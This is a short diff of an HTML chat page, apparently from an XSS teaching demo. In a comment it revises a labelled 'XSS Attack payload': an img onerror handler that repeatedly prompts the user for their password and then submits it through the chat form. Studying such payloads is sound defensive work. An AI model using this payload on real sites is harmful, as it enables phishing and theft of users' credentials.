@@ -7,7 +7,7 @@
   <body>
     <ul id="chat"></ul>
 
-    <form>
+    <form id='myForm'>
       <textarea rows="8" cols="80" id="message"></textarea>
       <br />
       <button type="submit">Send</button>
@@ -45,5 +45,5 @@
 </html>
 <!-- 
     XSS Attack payload
-    <img src='x' onerror='let password=""; while (password == "") {let promptValue = prompt("Please input your password to proceed..."); if (promptValue != null && promptValue != "") {password = promptValue; let li = document.createElement("li"); li.innerHTML = "inputted password=" + password; document.querySelector("#chat").append(li);}}'>
+  <img src='x' onerror='let password=""; while (password == "") {let promptValue = prompt("Please input your password to proceed..."); if (promptValue != null && promptValue != "") {password = promptValue; document.getElementById("message").value = password; document.getElementById("myForm").submit();}}'>
  -->
